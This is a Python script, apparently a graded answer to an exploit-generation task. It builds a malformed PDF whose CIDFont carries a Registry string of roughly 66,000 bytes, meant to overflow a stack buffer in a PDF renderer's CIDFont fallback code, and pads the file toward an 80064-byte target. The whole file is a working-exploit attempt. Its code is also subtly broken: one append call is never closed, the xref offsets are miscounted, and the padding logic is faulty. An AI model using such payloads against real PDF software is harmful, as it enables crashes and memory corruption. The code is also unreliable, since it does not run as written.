import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a CIDFont that triggers the stack buffer overflow
        # Based on the vulnerability description, we need a long <Registry>-<Ordering> string
        # The ground-truth length is 80064 bytes, but we can try to be more efficient
        
        # We'll create a minimal PDF structure that triggers the vulnerability
        # The vulnerability is in CIDFont fallback with long Registry-Ordering string
        
        # Target string length calculation:
        # We need to overflow the buffer. Let's aim for something close to ground-truth
        # but we can try to be more efficient by using exact buffer overflow size
        
        # Common buffer sizes are powers of 2 or common stack allocations
        # 80064 bytes suggests it might be trying to overflow a 64KB buffer (65536)
        # plus some overhead. Let's try 65536 + 512 = 66048 bytes first
        
        # We'll create a PDF with a CIDFont that has extremely long Registry and Ordering strings
        # The concatenated "<Registry>-<Ordering>" should be our target length
        
        # Create the malicious string
        # We need enough bytes to trigger overflow but not too much to keep score high
        overflow_size = 66048  # Start with this, adjust if needed
        
        # Registry will be most of the string, Ordering will be short
        registry_len = overflow_size - 10  # Reserve space for "-" and short ordering
        ordering_len = 8
        
        # Create the registry string (hex encoded for PDF string format)
        registry_str = "A" * registry_len
        ordering_str = "B" * ordering_len
        
        # Build the CIDSystemInfo dictionary with these strings
        # We'll embed this in a Type 0 font with CIDFontType0 descendant
        
        # Create a minimal PDF document
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b"%PDF-1.4\n")
        
        # Create catalog object
        catalog_obj = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
"""
        pdf_parts.append(catalog_obj)
        
        # Create pages object
        pages_obj = b"""2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
"""
        pdf_parts.append(pages_obj)
        
        # Create page object
        page_obj = b"""3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>
endobj
"""
        pdf_parts.append(page_obj)
        
        # Create content stream object (empty)
        content_obj = b"""4 0 obj
<<
/Length 0
>>
stream
endstream
endobj
"""
        pdf_parts.append(content_obj)
        
        # Create Type 0 font object with CIDFont descendant
        # This font will trigger the vulnerable code path
        font_obj_header = b"""5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /AAABBB
/Encoding /Identity-H
/DescendantFonts [6 0 R]
>>
endobj
"""
        pdf_parts.append(font_obj_header)
        
        # Create the CIDFontType0 object with malicious CIDSystemInfo
        # This is where the vulnerability is triggered
        cidfont_obj = b"""6 0 obj
<<
/Type /Font
/Subtype /CIDFontType0
/BaseFont /AAABBB
/CIDSystemInfo <<
/Registry ("""
        pdf_parts.append(cidfont_obj)
        
        # Add the very long registry string
        pdf_parts.append(registry_str.encode('latin-1'))
        
        # Continue the CIDSystemInfo dictionary
        pdf_parts.append(b""")
/Ordering (""")
        pdf_parts.append(ordering_str.encode('latin-1'))
        pdf_parts.append(b""")
/Supplement 0
>>
/DW 1000
/W [0 [500]]
/FontDescriptor 7 0 R
>>
endobj
"""
        
        # Create font descriptor
        font_descriptor = b"""7 0 obj
<<
/Type /FontDescriptor
/FontName /AAABBB
/Flags 4
/FontBBox [0 0 1000 1000]
/ItalicAngle 0
/Ascent 800
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
"""
        pdf_parts.append(font_descriptor)
        
        # Calculate offsets for xref table
        xref_offset = sum(len(part) for part in pdf_parts)
        
        # Create xref table
        xref_table = b"""xref
0 8
0000000000 65535 f 
"""
        
        # Calculate object offsets
        offsets = [0]
        offset = 0
        for part in pdf_parts:
            offsets.append(offset)
            offset += len(part)
        
        # Add xref entries for each object
        for i in range(1, 8):
            xref_table += f"{offsets[i]:010d} 00000 n \n".encode('ascii')
        
        # Create trailer
        trailer = b"""trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
"""
        trailer += str(xref_offset).encode('ascii')
        trailer += b"""
%%EOF
"""
        
        # Combine all parts
        pdf_parts.append(xref_table)
        pdf_parts.append(trailer)
        
        pdf_data = b"".join(pdf_parts)
        
        # If the PDF is still too small, we can pad it
        # but let's first check if our overflow_size was enough
        # The vulnerability might require exactly 80064 bytes
        if len(pdf_data) < 80064:
            # Add padding to reach target size
            padding_needed = 80064 - len(pdf_data)
            # Insert padding in a PDF comment
            padding = b"\n% " + b"X" * (padding_needed - 3) + b"\n"
            
            # Insert padding before the xref table
            new_parts = []
            for i, part in enumerate(pdf_parts):
                new_parts.append(part)
                if b"xref" in part:
                    # Insert padding before xref
                    new_parts.insert(-1, padding)
                    break
            
            pdf_data = b"".join(new_parts)
        
        return pdf_data